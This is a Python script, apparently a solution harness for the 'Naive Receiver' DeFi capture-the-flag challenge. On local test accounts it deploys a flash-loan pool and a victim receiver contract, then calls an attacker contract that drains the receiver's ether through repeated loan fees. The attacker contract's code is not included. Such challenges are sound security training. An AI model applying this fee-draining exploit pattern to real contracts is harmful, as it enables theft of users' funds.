from ape import accounts, project
from ..utils.helper import w3, set_balance, reverts

# pool has 1000 ETH in balance
ETHER_IN_POOL = w3.to_wei(1000, "ether")

# receiver has 10 ETH in balance
ETHER_IN_RECEIVER = w3.to_wei(10, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]
    user = accounts.test_accounts[2]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n⇒ Some user: {user}\n---\n"
    )
    # fund deployer account with extra ETH for setup
    print("\n--- Funding deployer address with extra ether for set up ---\n")
    set_balance(deployer.address, w3.to_wei(1011, "ether"))

    # deploy lender pool contract
    print("\n--- Deploying Pool contract ---\n")
    pool = project.NaiveReceiverLenderPool.deploy(sender=deployer)

    # fund pool with ether
    print("\n--- Deployer is funding the pool with ether ---\n")
    deployer.transfer(pool, ETHER_IN_POOL)
    ETH = pool.ETH()

    assert pool.balance == ETHER_IN_POOL
    assert pool.maxFlashLoan(ETH) == ETHER_IN_POOL
    assert pool.flashFee(ETH, 0) == w3.to_wei(1, "ether")

    # deploy receiver contract
    print("\n---  User is deploying Flash Loan Receiver contract ---\n")
    receiver = project.FlashLoanReceiver.deploy(pool, sender=user)

    # fund receiver with ether
    print("\n--- User is funding their reciever contract with ether ---\n")
    deployer.transfer(receiver, ETHER_IN_RECEIVER)

    with reverts():
        receiver.onFlashLoan(
            deployer,
            ETH,
            ETHER_IN_RECEIVER,
            w3.to_wei(1, "ether"),
            b"",
            sender=deployer,
        )
    assert receiver.balance == ETHER_IN_RECEIVER

    # define intial balances for Attacker and Receiver contract
    pool_initial_bal = pool.balance / 10**18
    receiver_initial_bal = receiver.balance / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Pool: {pool_initial_bal}\n⇒ User's Receiver Contract: {receiver_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    attacker_contract = project.NaiveReceiverAttacker.deploy(
        pool, receiver, sender=attacker
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Receiver contract should have no more ether ---\n")

    # define ending balances for Attacker and Receiver contract
    pool_ending_bal = pool.balance / 10**18
    receiver_ending_bal = receiver.balance / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Pool: {pool_ending_bal}\n⇒ User's Receiver Contract: {receiver_ending_bal}\n---\n"
    )

    assert receiver.balance == 0
    assert pool.balance == ETHER_IN_POOL + ETHER_IN_RECEIVER

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
